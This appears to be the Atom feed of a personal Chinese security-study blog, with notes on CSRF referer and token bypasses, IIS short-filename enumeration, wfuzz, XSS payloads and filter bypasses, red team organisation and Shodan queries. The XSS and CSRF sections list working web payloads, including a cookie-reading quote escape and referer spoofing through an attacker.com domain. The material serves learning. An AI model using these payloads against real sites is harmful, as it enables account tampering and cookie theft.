<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Morn-zh.github.io</id>
    <title>Morn-zh</title>
    <updated>2021-05-27T04:32:28.806Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Morn-zh.github.io"/>
    <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
    <subtitle>我等着，等着你</subtitle>
    <logo>https://Morn-zh.github.io/images/avatar.png</logo>
    <icon>https://Morn-zh.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Morn-zh</rights>
    <entry>
        <title type="html"><![CDATA[cncd爬虫-20210527]]></title>
        <id>https://Morn-zh.github.io/post/cncd-pa-chong-20210527/</id>
        <link href="https://Morn-zh.github.io/post/cncd-pa-chong-20210527/">
        </link>
        <updated>2021-05-27T04:30:29.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/cnkv%E7%88%AC%E8%99%AB/QQ%E6%88%AA%E5%9B%BE20210527122945.png" alt="QQ截图20210527122945" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/cnkv%E7%88%AC%E8%99%AB/cnvd%E7%88%AC%E8%99%AB%E2%80%9420210525-1622089886246.png" alt="cnvd爬虫—20210525" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CSRF绕过]]></title>
        <id>https://Morn-zh.github.io/post/csrf-rao-guo/</id>
        <link href="https://Morn-zh.github.io/post/csrf-rao-guo/">
        </link>
        <updated>2021-05-24T04:32:16.000Z</updated>
        <content type="html"><![CDATA[<h1 id="csrf绕过">CSRF绕过</h1>
<p>CSRF针对客户端，让用户在不知情的条件下执行某些请求</p>
<p>常见的验证手段</p>
<ul>
<li>
<p>referer</p>
<p>验证referrer是否在允许的域内</p>
</li>
<li>
<p>token</p>
<p>验证token是否相同，存在于前端，也存在于后端</p>
</li>
</ul>
<h2 id="绕过referrer的方式">绕过referrer的方式</h2>
<h3 id="1-使referer为空">1、使referer为空</h3>
<p>利用其它的协议，从而让请求头中referer为空</p>
<p>可用的协议如下</p>
<p><code>ftp://</code><br>
<code>file://</code><br>
<code>data:</code><br>
<code>https--&gt;http</code>(在https的站点下发起http请求)<br>
<code>javascript</code>（未验证）</p>
<p>可能用到的html标签</p>
<p><code>iframe</code>(在src属性中)–InternetExplorer下不⼯作----&gt;一般使用这个<br>
<code>embed</code>(在src属性中)–InternetExplorer及MicrosoftEdge下不⼯作<br>
<code>object</code>(在data属性中)–InternetExplorer及MicrosoftEdge下不⼯作</p>
<h4 id="实践data协议绕过">实践：data协议绕过</h4>
<h5 id="本地环境">本地环境</h5>
<p>php5.7</p>
<p>pikachu靶场</p>
<p>notepad++</p>
<p>BS</p>
<h5 id="准备工作">准备工作</h5>
<p>目标：让用户在不知情的情况下修改自己的手机号</p>
<p>要求：此时用户必须处于登录状态，所以说执行csrf攻击还是需要用户配合（用户：我是被迫的！</p>
<h5 id="开始">开始</h5>
<p>用户登录</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-31-07.png" alt="Snipaste_2021-05-22_16-31-07" loading="lazy"></figure>
<p>抓取并修改信息的数据包</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-32-46.png" alt="Snipaste_2021-05-22_16-32-46" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-33-18.png" alt="Snipaste_2021-05-22_16-33-18" loading="lazy"></figure>
<p>可以看到，我改变了数据包中手机的信息，然后我们使用BS提供CSRFpoc生成poc（这里别忘了将原本的修改请求drop掉，防止造成影响</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-33-37.png" alt="Snipaste_2021-05-22_16-33-37" loading="lazy"></figure>
<p>保存到本地，命名为test.html</p>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-35-51.png" alt="Snipaste_2021-05-22_16-35-51" loading="lazy"></figure>
<p>改写poc，使用<code>data</code>协议，并且对表单内容进行base64编码，防止表单中的某些内容造成干扰（编码啥的，容易造成错误</p>
<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-36-57.png" alt="Snipaste_2021-05-22_16-36-57" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-37-19.png" alt="Snipaste_2021-05-22_16-37-19" loading="lazy"></figure>
<p>至此，脚本写完，将这个链接发送给用户，如果是get请求会直接执行，post请求需要构造一下，让用户再好奇的驱使下点一下（社工</p>
<p>比如，网址就为127.0.0.1/test.html</p>
<p>用户看到的页面是这样的</p>
<figure data-type="image" tabindex="8"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-51-54.png" alt="Snipaste_2021-05-22_16-51-54" loading="lazy"></figure>
<p>用户点击后</p>
<figure data-type="image" tabindex="9"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-52-13.png" alt="Snipaste_2021-05-22_16-52-13" loading="lazy"></figure>
<p>此时再去看下，用户的手机号，发现已经被更改</p>
<figure data-type="image" tabindex="10"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-52-59.png" alt="Snipaste_2021-05-22_16-52-59" loading="lazy"></figure>
<p>在用户点击这个按钮之后，就发送了一条post信息，修改了Ta的手机号</p>
<p>我们查看下用户点击时发送的包中的referer</p>
<figure data-type="image" tabindex="11"><img src="https://Morn-zh.github.io/post-images/referer%E7%BB%95%E8%BF%87/Snipaste_2021-05-22_16-52-38.png" alt="Snipaste_2021-05-22_16-52-38" loading="lazy"></figure>
<p>可以看到，并没有referer信息，达到绕过referer的目的（没有referer，它可能就不验证了</p>
<h3 id="2-绕过referer过滤">2、绕过referer过滤</h3>
<p>这个绕过主要是利用网站对referer验证的不严谨</p>
<h4 id="绕过匹配某些字段">绕过匹配某些字段</h4>
<ul>
<li>
<p>创建对应的文件夹</p>
<pre><code> www.attacker.com/target.com
</code></pre>
<p>此时<code>target.com</code>是我们网站下的文件（夹）名</p>
</li>
<li>
<p>创建对应的子域名</p>
<pre><code>target.com.attacker.com
</code></pre>
<p>此时<code>target.com</code>是我们网站的子域名</p>
</li>
</ul>
<h4 id="利用网站本身的跳转">利用网站本身的跳转</h4>
<pre><code>www.target.com/login/redirect_url= www.attacker.com
www.target.com/login/callback= www.attacker.com
</code></pre>
<p>利用网站本身的跳转连接，这样产生的referer就是网站本身，那么验证就过去了</p>
<h2 id="绕过token的方式">绕过token的方式</h2>
<h3 id="token验证机制">token验证机制</h3>
<h4 id="服务器验证">服务器验证</h4>
<p>服务器生成令牌token，然后发送给用户，用户之后的请求带有该token，服务器接收到该带有token的请求时，将验证该token，验证成功，继续执行后续操作。否则，不成功。</p>
<p>验证成功后，更新token，重复上述过程</p>
<p>这种机制类似一次一密，防止中间人攻击</p>
<h4 id="前端验证极度不安全">前端验证（极度不安全）</h4>
<p>与上面那种基于服务器的token一样，生成token发送给客户端</p>
<p>而验证是发生在客户端发起请求的时候。它会验证请求中的token参数与cookie中的token是否相同</p>
<h3 id="如何绕过">如何绕过</h3>
<p>绕过都是关键是获得token</p>
<p>如何能够得到token呢？</p>
<p>如果token在页面源码中存在（一般位于hidden标签内），我们可以通过定位到该值，应用即可（解析页面，xpath定位或者直接应用BS的提取功能）</p>
<p>如果token位于url中，通过xss使其访问自己的站点，此时我们可以在访问日志中得到该url，提取出即可</p>
<p>如果token位于cookie中，试着用xss配合着提取出token</p>
<p>如果还不行，试着删除token，或者设置为空（或空列表），服务器可能就会放过你（看负责验证的应用程序的验证逻辑是咋样了</p>
<p>如果是前端的验证，配合xss一样可以提取出cookie中的token</p>
<p>但如果不行呢？我们可以尝试下会话劫持和会话固定（伪造token，自己验证自己</p>
<p>session攻击（会话劫持+固定）与防御：https://www.cnblogs.com/phpstudy2015-6/p/6776919.html</p>
<p>参考文章</p>
<p>关于CSRF 和 csrftoken： https://www.cnblogs.com/sablier/p/11099909.html</p>
<p>cookie、session与token的真正区别：https://blog.csdn.net/whl190412/article/details/90024671?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242</p>
<p>cookie，session和token的概念以及区别：http://cache.baiducontent.com/c?m=5vE7nbvcJ9DPTmSffAAG-Abj7lSGiJpuF91JgLmCyY-OgApFY9ms5t5W4C5hdbhX4mlrNVmbwqaL4IPBNxMo3agK9OFS67jj45koQ4v8FOPqvfb1KBImTF9P0AnFMFEBkSHzKPVVWWl_wrfIjqo52YnBoVW65DFHMRXdOyZgHHA1a5PiM1OGk0Q6NnpWQEfC&amp;p=8e759a46d1891fe70be296244f40&amp;newp=8b2a971896851aff57ee9360494192695d0fc20e3ddcd101298ffe0cc4241a1a1a3aecbf2c261103d4c57a6007ad4356edfa3d723d0034f1f689df08d2ecce7e72c8616f&amp;s=cfcd208495d565ef&amp;user=baidu&amp;fm=sc&amp;query=session%BA%CDtoken%B5%C4%C7%F8%B1%F0&amp;qid=eab3de350024cebb&amp;p1=3</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[IIS短文件名泄露]]></title>
        <id>https://Morn-zh.github.io/post/iis-duan-wen-jian-ming-xie-lu/</id>
        <link href="https://Morn-zh.github.io/post/iis-duan-wen-jian-ming-xie-lu/">
        </link>
        <updated>2021-05-13T14:10:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="测试环境">测试环境</h2>
<p>windows server 2003 r2</p>
<p>开启webdav服务和net服务。</p>
<h2 id="漏洞成因">漏洞成因</h2>
<p>为兼容16位的MS-DOS系统，windows会对较长的文件、目录生成短文件名</p>
<p>查看段文件名</p>
<pre><code>dir /x
</code></pre>
<p>在启用.net的IIS下暴力列举短文件名，原因是：</p>
<p>（1）<strong>访问构造的某个存在的短文件名，会返回404</strong>；<br>
（2）<strong>访问构造的某个不存在的短文件名，会返回400</strong>。</p>
<p>漏洞的应用</p>
<p>猜解物理路径、敏感文件，为后续的漏洞挖掘收集信息</p>
<p>似乎好用，但有一定局限性</p>
<h2 id="漏洞利用">漏洞利用</h2>
<h3 id="手工">手工</h3>
<pre><code>http://www.target.com/a*~1*/a.aspx
</code></pre>
<pre><code>http://www.target.com/b*~1*/a.aspx
</code></pre>
<p>……</p>
<p>存在则返回404，否则返回400</p>
<blockquote>
<p>短文件名命名规则：前六位~1.三位后缀名</p>
</blockquote>
<p>需要猜解六位，假设猜解到如下情况</p>
<pre><code>http://www.target.com/abcdef*~1*/a.aspx
</code></pre>
<p>这时候需要判断这个是文件夹还是文件</p>
<p>尝试下</p>
<pre><code>http://www.target.com/abcdef*~1/a.aspx
</code></pre>
<p>如果返回404，说明是个文件夹，反之400，则是文件，继续后续猜解</p>
<pre><code>http://www.target.com/abcdef*~1.a*/a.aspx
</code></pre>
<pre><code>http://www.target.com/abcdef*~1.b*/a.aspx
</code></pre>
<pre><code>http://www.target.com/abcdef*~1.c*/a.aspx
</code></pre>
<p>……</p>
<p>假设最后得到</p>
<pre><code>http://www.target.com/abcdef*~1.zip/a.aspx
</code></pre>
<p>猜解基本就到这了，我们暂时无法得知中间星号隐藏掉的信息。</p>
<p>但是，我们可以按照这个思路继续猜，或许能猜出完整的文件名</p>
<h3 id="工具">工具</h3>
<p>https://github.com/lijiejie/IIS_shortname_Scanner</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集之敏感路径]]></title>
        <id>https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-min-gan-lu-jing/</id>
        <link href="https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-min-gan-lu-jing/">
        </link>
        <updated>2021-05-13T14:08:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="哪些路径或是接口是有价值的">哪些路径或是接口是有价值的？</h2>
<ul>
<li>
<p>未授权直接访问的登录页⾯</p>
</li>
<li>
<p>⽆需登录即可操作的上传页⾯</p>
</li>
<li>
<p>编辑器</p>
</li>
<li>
<p>后台</p>
</li>
<li>
<p>历史版本</p>
</li>
<li>
<p>错误页⾯导致应⽤版本等信息泄露</p>
</li>
<li>
<p>phpinfo页⾯</p>
</li>
</ul>
<p>……</p>
<h2 id="寻找方式">寻找方式</h2>
<h3 id="目录扫描">目录扫描</h3>
<p>字典+目录扫描工具</p>
<ul>
<li>
<p>御剑</p>
</li>
<li>
<p>dirbuster</p>
</li>
<li>
<p>burp</p>
</li>
<li>
<p>wfuzz</p>
</li>
</ul>
<p>....</p>
<h4 id="wfuzz">wfuzz</h4>
<p>wfuzz是⼀款为了评估WEB应⽤⽽⽣的Fuzz（Fuzz是爆破的⼀种⼿段）⼯具，它基于⼀个简单的理念，即⽤给定的Payload 去f uzz。它允许在HTTP请求⾥注⼊任何输⼊的值，针对不同的WEB应⽤组件进⾏多种复杂的爆破攻击。⽐如：参数、认 证、表单、⽬录/⽂件、头部等等，这款⼯具在kali⾥⾯⾃带</p>
<p>https://github.com/xmendez/wfuzz</p>
<p>windows或其他linux系统直接pip安装即可</p>
<pre><code>pip install wfuzz
</code></pre>
<h5 id="-u">-u</h5>
<p>指定目标</p>
<pre><code>wfuzz -u 
</code></pre>
<h5 id="-w">-w</h5>
<p>指定字典</p>
<pre><code>wfuzz -w fuzz1.txt -w fuzz2.txt -u https://morn-zh.github.io/FUZZ/FUZ2Z/
</code></pre>
<p>fuzz1.txt</p>
<pre><code>post
xxx
ket
ada
</code></pre>
<p>fuzz2.txt</p>
<pre><code>post
xxx
ket
ada
phpinfo-zhong-zhi-de-zhu-yi-de-dian
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%95%8F%E6%84%9F%E8%B7%AF%E5%BE%84/Snipaste_2021-05-07_20-59-22.png" alt="Snipaste_2021-05-07_20-59-22" loading="lazy"></figure>
<h5 id="过滤">过滤</h5>
<p>为了防止大面积的打印信息，需要对信息进行过滤</p>
<h6 id="-hccode">--hc(code)</h6>
<p>过滤响应码</p>
<h6 id="-hlline">--hl(line)</h6>
<p>通过响应报文行数进行过滤</p>
<h6 id="-hwword">--hw(word)</h6>
<p>通过响应报文字数进行隐藏</p>
<h6 id="-hhchar">--hh(char)</h6>
<p>通过响应报文字符数进行过滤</p>
<p>wfuzz会在窗口处展示行数、字数、字符数，你可以先大致的看一眼，把那些没用的记录下过滤掉即可</p>
<pre><code>wfuzz -w fuzz1.txt -w fuzz2.txt -u https://morn-zh.github.io/FUZZ/FUZ2Z/ --hh 88
</code></pre>
<pre><code>wfuzz -w fuzz1.txt -w fuzz2.txt -u https://morn-zh.github.io/FUZZ/FUZ2Z/ --hc 404
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%95%8F%E6%84%9F%E8%B7%AF%E5%BE%84/Snipaste_2021-05-07_21-00-19.png" alt="Snipaste_2021-05-07_21-00-19" loading="lazy"></figure>
<p>这里有个比较好用的</p>
<p>先列出命令</p>
<pre><code>wfuzz -w fuzz2.txt -u https://morn-zh.github.io/post/FUZZ{phpinfo-zhong-zhi-de-zhu-yi-de-dian}/ --hh BBB
</code></pre>
<p>可以看见多了个参数--hh BBB（这是固定的），还多了个花括号</p>
<p>大致流程是这样的，wfuzz会先查请求<code>https://morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian</code>，得到响应报文，后续与<strong>这次请求的报文相同</strong>的payload就会被隐藏</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%95%8F%E6%84%9F%E8%B7%AF%E5%BE%84/Snipaste_2021-05-07_21-18-21.png" alt="Snipaste_2021-05-07_21-18-21" loading="lazy"></figure>
<p>也就是说，我们可以手动发送一个不存在的请求，然后只要后续失败的payload取得的响应与这个相同，就会自动隐藏掉了~</p>
<p>举个例子，发送个错误的请求</p>
<pre><code>wfuzz -w fuzz2.txt -u https://morn-zh.github.io/post/FUZZ{AA}/ --hh BBB
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%95%8F%E6%84%9F%E8%B7%AF%E5%BE%84/Snipaste_2021-05-07_21-25-05.png" alt="Snipaste_2021-05-07_21-25-05" loading="lazy"></figure>
<p>和这个不一样的就会被隐藏！</p>
<h5 id="-h">-H</h5>
<p>指定请求头</p>
<p>每个参数都需要指定一次，有点麻烦（可能是操作原因</p>
<pre><code>wfuzz -H &quot;host:xx.xx.xx.xx&quot; -H &quot;cookie:xxxxxx&quot; -u &quot;http://www.xxx.com&quot;
</code></pre>
<p>更详细的参数：</p>
<p>https://blog.csdn.net/qq_17204441/article/details/102279118</p>
<p>https://blog.csdn.net/bylfsj/article/details/102630816</p>
<p>0507继续看上面的文章</p>
<h3 id="在js文件中寻找敏感接口">在JS⽂件中寻找敏感接⼝</h3>
<p>待定~</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSS]]></title>
        <id>https://Morn-zh.github.io/post/xss/</id>
        <link href="https://Morn-zh.github.io/post/xss/">
        </link>
        <updated>2021-05-13T13:43:44.000Z</updated>
        <content type="html"><![CDATA[<h1 id="xss">XSS</h1>
<h2 id="概述">概述</h2>
<p>简单的说，攻击者构造的恶意脚本代码被浏览器运行了</p>
<h2 id="分类">分类</h2>
<ul>
<li>
<p>反射型</p>
<p>一次性的，一般攻击者会诱骗用户点击某个链接，从而使页面运行嵌入的脚本</p>
</li>
<li>
<p>存储型</p>
<p>长时间的，构造的恶意代码被写入到了数据库，用户访问页面（正常页面）时会从数据库中调出该恶意代码，继而恶意代码执行</p>
</li>
<li>
<p>DOM型</p>
<p>基于⽂档对象模型DOM（Document Objeet Model），不经过后端，直接改变当前页面，其实可以归类到反射型中</p>
</li>
</ul>
<h2 id="检测">检测</h2>
<p>如果可以知道输出位置，试着输入特殊符号<code>&lt;&gt;()'&quot;</code>，查看HTML源代码是否被转义。如未被转义，可能存在漏洞</p>
<p>如果无法知道输出位置，构造看起来正常的文本，从而骗过管理员（</p>
<p>当然，扫描器也成。</p>
<h2 id="攻击">攻击</h2>
<h3 id="可能存在xss的地方">可能存在XSS的地方</h3>
<h4 id="html节点">HTML节点</h4>
<pre><code>&lt;div&gt;&lt;/div&gt;
&lt;p&gt;&lt;/p
</code></pre>
<p>payload</p>
<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;
</code></pre>
<pre><code>&lt;svg/onload=alert()&gt;
</code></pre>
<h4 id="html属性">HTML属性</h4>
<pre><code>&lt;imgsrc=&quot;#{image}&quot;/&gt;
&lt;inputvalue=&quot;#{text}&quot;/&gt;
</code></pre>
<p>payload</p>
<pre><code>&lt;imgsrc=&quot;1&quot;onerror=&quot;alert(1)&quot;/&gt;
&lt;inputvalue=&quot;1&quot;onclick=&quot;alert(1)&quot;/&gt;
&lt;imgsrc=&quot;javascript:alert(1)&quot;/&gt;
&quot;,',`
</code></pre>
<h4 id="js代码">JS代码</h4>
<pre><code>&lt;script&gt;
vardata=&quot;#{data}&quot;;
&lt;/script&gt;
</code></pre>
<p>payload</p>
<pre><code>hello&quot;;alert(1);&quot;
</code></pre>
<h4 id="富文本">富文本</h4>
<p>=v=</p>
<h3 id="bypass">ByPass</h3>
<h4 id="标签限制">标签限制</h4>
<p>限制了就用没限制的呗</p>
<p>Body标签</p>
<pre><code>&lt;bodyonpageshow=alert(1)&gt;
</code></pre>
<p>Style标签</p>
<pre><code>&lt;styleonload=alert(1)/&gt;
</code></pre>
<p>Marquee标签</p>
<pre><code>&lt;marqueebehavior=&quot;alternate&quot;onstart=alert(1)&gt;hacktheplanet&lt;/marquee&gt;&lt;marqueeloop=&quot;1&quot;
onfinish=alert(1)&gt;hacktheplanet&lt;/marquee&gt;&lt;marqueeonstart=alert(1)&gt;hacktheplanet&lt;/marquee&gt;
</code></pre>
<p>media标签</p>
<pre><code>&lt;audiooncanplay=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;audioondurationchange=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;audioautoplay=trueonended=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;audioonloadeddata=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;audioonloadedmetadata=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;audioonloadstart=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;audioonprogress=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;audioonsuspend=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
&lt;videooncanplay=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
&lt;videoondurationchange=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
&lt;videoautoplay=trueonended=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
&lt;videoonloadeddata=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
&lt;videoonloadedmetadata=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
&lt;videoonloadstart=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
&lt;videoonprogress=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
&lt;videoonsuspend=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
</code></pre>
<h4 id="限制动作">限制动作</h4>
<pre><code>eval('~a~le~rt~~(~~1~~)~'.replace(/~/g,''))
</code></pre>
<pre><code>eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g,newString()))
</code></pre>
<pre><code>varx=eval;x('alert(1)')
</code></pre>
<pre><code>varx=eval;x('alert(1)')
</code></pre>
<h4 id="引号逃逸">引号逃逸</h4>
<pre><code>&lt;script&gt;
varid=&quot;接收参数传进来的值&quot;;
&lt;/script&gt;
</code></pre>
<p>payload</p>
<pre><code>xss_attack&quot;%0aalert(document.cookie)%0a&quot;
</code></pre>
<p>XSS利用编码绕过参考文章</p>
<p>https://blog.csdn.net/qq_37133717/article/details/94651840</p>
<p>https://blog.csdn.net/Fly_hps/article/details/82944455</p>
<h4 id="长度限制">长度限制</h4>
<p>使用特殊符号一个顶俩、使用别的标签</p>
<pre><code>&lt;script/src=//⑭.₨&gt;
</code></pre>
<p>https://www.freebuf.com/column/220970.html</p>
<h2 id="危害">危害</h2>
<p>盗取cookie</p>
<p>修改网页内容</p>
<p>挂马</p>
<p>重定向（引流、跳转别的危险页面</p>
<p>XSS蠕虫</p>
<h2 id="随笔">随笔</h2>
<p>后期按时更新（两天一更），顺便帮助自己复习</p>
<p>学一点有一点的欢喜！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[我眼中的红队（转载）]]></title>
        <id>https://Morn-zh.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/</id>
        <link href="https://Morn-zh.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/">
        </link>
        <updated>2021-05-12T10:38:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="我眼中的红队">我眼中的红队</h1>
<p>仅聊一聊我自己眼中的红队，如有异议请指教。</p>
<p>作者：林晨</p>
<h2 id="关于红队">关于红队</h2>
<p>红队：通常指攻防演习中的攻击方</p>
<h2 id="红队评估">红队评估</h2>
<p>在聊红队结构的组成之前我们需要了解红队评估的简单流程和技术手段。</p>
<h3 id="红队评估流程">红队评估流程</h3>
<p>1.打点：通过弱口令、文件上传、命令执行、社工等技术手段对Web、App、IoT等一切暴露在互联网的服务和个人PC等防守方内部机器进行外部攻击，并尝试获取内网入口权限也就是当前被攻击服务所在系统的权限；</p>
<p>2.横向：获取到内网入口权限后对当前主机的开放端口、运行进程、配置密码、内网网段、域等一切有价值的信息进行收集，并对收集到的信息进行分析、关联、整合并结合相关的技术手段进一步的对内网主机进行漏洞发现、权限和数据获取等操作；</p>
<p>3.报告：将红队评估过程中所涉技术手段、安全风险、所涉单位等信息进行梳理，整合成文档报告用于项目交付和复盘总结。</p>
<h2 id="红队结构">红队结构</h2>
<p>在一般的攻防演习活动中所需的红队人员数为三人，三人分别是：队长、渗透师、横向师。</p>
<p>红队人员都应涉及较为全面的技术领域，除此之外可以细分三人的技术领域和应有的能力。</p>
<p>队长：技术综合能力较强，应具备较好的团队协作能力、组织能力、应变能力；</p>
<p>渗透师：前渗透能力较强，在演习过程中需能“稳、狠、准、快”的寻找到边界点并进行突破（打点）；</p>
<p>横向师：后渗透能力较强，根据渗透师的打点结果进行梳理，横向渗透其他内网服务和主机，全面的评估内网的安全体系。</p>
<h2 id="红队建设">红队建设</h2>
<p>建立一支优秀的红队所需：人员、武器库、漏洞库</p>
<p>1.人员：招聘、公司内部转换、人才培养；</p>
<p>2.武器库建设：将红队评估参与的人员比喻成一线，那么建设武器库的人员就是二线，二线人员不需要直接参与到红队评估中，但需要起到支撑作用；例如将一线人员的需求进行工具、脚本化的转变；</p>
<p>3.漏洞库建设：同上所述漏洞库的建设也离不开人员，除了红队评估人员自我产出的通用漏洞积累除外，还需要一批专门做漏洞研究的人员作为二线进行漏洞研究，以便于一线评估人员更“快速”的进行攻防。</p>
<h3 id="准备工作">准备工作</h3>
<p>协作平台<br>
俗话说的好“三个臭皮匠顶一个诸葛亮”，红队评估这件事情从来都不是一个人的“战斗”，它需要团队协作共同完成。</p>
<p>每个红队成员都有自己较为熟悉的技术领域，这也就导致了每个人所“打”的点和所“看”的面不同，要想全面的进行评估工作就需要协作平台将每个人的信息进行汇总便于每个人都能接触到“不同面”的信息。</p>
<h3 id="协作平台的推荐">协作平台的推荐：</h3>
<p>1.Codimd - https://github.com/hackmdio/codimd （Markdown文档协作平台）</p>
<p>2.CobaltStrike - https://www.cobaltstrike.com （后渗透团队协作平台）</p>
<h3 id="成员">成员</h3>
<p>1.队长：与主办方沟通了解比赛时间、比赛规则，有时可针对“规则漏洞”制定攻击方案；搭建所需的协作平台；</p>
<p>2.渗透师：应将前渗透中的通用技术手段（外网开放端口、服务弱口令扫描、信息泄露）转换为工具进行一键批量自动化，也可在规则允许的情况下准备对应的扫描器（通常目标几百、上千个的情况下没有精力一个一个的手工查看）；</p>
<p>3.横向师：应将内网的弱口令扫描、端口扫描、高危漏洞扫描等操作转换为工具进行一键批量自动化，避免在后期的横向中浪费大量的不必要时间。</p>
<p>转载自：https://gh0st.cn/archives/2019-09-21/1</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集之shodan]]></title>
        <id>https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-shodan/</id>
        <link href="https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-shodan/">
        </link>
        <updated>2021-05-09T14:53:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="信息收集之shodan">信息收集之shodan</h1>
<p>shodan音译就是撒旦，一个用来搜索在线设备的搜索引擎</p>
<p>shodan有3个使用方式，一个是直接网页访问，一个是命令行，一个是python代码中引用</p>
<h2 id="网页版">网页版</h2>
<p>网址：https://www.shodan.io/</p>
<p>现在想要搜索需要后才能使用，并且普通用户有搜索条数的限制</p>
<h3 id="常见过滤命令">常见过滤命令</h3>
<ul>
<li><code>hostname</code>：搜索指定的主机或域名，例如 <code>hostname:&quot;google&quot;</code></li>
<li><code>port</code>：搜索指定的端口或服务，例如 <code>port:&quot;21&quot;</code></li>
<li><code>country</code>：搜索指定的国家，例如 <code>country:&quot;CN&quot;</code></li>
<li><code>city</code>：搜索指定的城市，例如 <code>city:&quot;Hefei&quot;</code></li>
<li><code>org</code>：搜索指定的组织或公司，例如 <code>org:&quot;google&quot;</code></li>
<li><code>isp</code>：搜索指定的ISP供应商，例如 <code>isp:&quot;China Telecom&quot;</code></li>
<li><code>product</code>：搜索指定的操作系统/软件/平台，例如 <code>product:&quot;Apache httpd&quot;</code></li>
<li><code>version</code>：搜索指定的软件版本，例如 <code>version:&quot;1.6.2&quot;</code></li>
<li><code>geo</code>：搜索指定的地理位置，参数为经纬度，例如 <code>geo:&quot;31.8639, 117.2808&quot;</code></li>
<li><code>before/after</code>：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 <code>before:&quot;11-11-15&quot;</code></li>
<li><code>net</code>：搜索指定的IP地址或子网，例如 <code>net:&quot;210.45.240.0/24&quot;</code></li>
</ul>
<h3 id="实例">实例</h3>
<p>查找位于合肥的 Apache 服务器：</p>
<pre><code>apache city:&quot;Hefei&quot;
</code></pre>
<p>查找位于国内的 Nginx 服务器：</p>
<pre><code>nginx country:&quot;CN&quot;
</code></pre>
<p>查找 GWS(Google Web Server) 服务器：</p>
<pre><code>&quot;Server: gws&quot; hostname:&quot;google&quot;
</code></pre>
<p>查找指定网段的华为设备：</p>
<pre><code>huawei net:&quot;61.191.146.0/24&quot;
</code></pre>
